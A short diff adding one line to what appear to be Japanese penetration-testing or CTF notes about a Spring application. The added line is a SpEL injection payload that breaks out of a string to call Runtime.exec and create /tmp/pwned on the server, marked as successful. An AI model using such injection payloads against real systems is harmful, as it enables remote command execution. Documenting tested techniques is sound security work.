@@ -229,7 +229,8 @@ select m
 		* Springを使っていることがわかる
 
 * SpELを試す
-	* サーバー側にファイルを作成
+	* サーバー側にファイルを作成  
+	  `".isEmpty() && T(java.lang.Runtime).getRuntime().exec("touch /tmp/pwned") && "a`
 		* => 成功
 
 
